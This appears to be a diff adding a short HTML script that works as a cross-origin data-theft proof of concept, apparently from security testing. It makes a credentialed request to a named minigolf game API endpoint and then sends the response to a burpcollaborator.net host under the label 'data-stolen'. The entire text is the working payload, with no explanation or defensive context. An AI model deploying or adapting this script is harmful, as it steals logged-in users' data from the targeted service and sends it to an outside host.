@@ -1,0 +1,10 @@
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', "https://users-minigolf-api.withbuddies.com/echo");
+xhr.withCredentials = true;
+xhr.onload = function () {
+    this.open('GET', "https://12121ziuww50pbsilatov6aq2h87ww.burpcollaborator.net/data-stolen=" + this.responseText);
+    this.send();
+};
+xhr.send();
+</script>
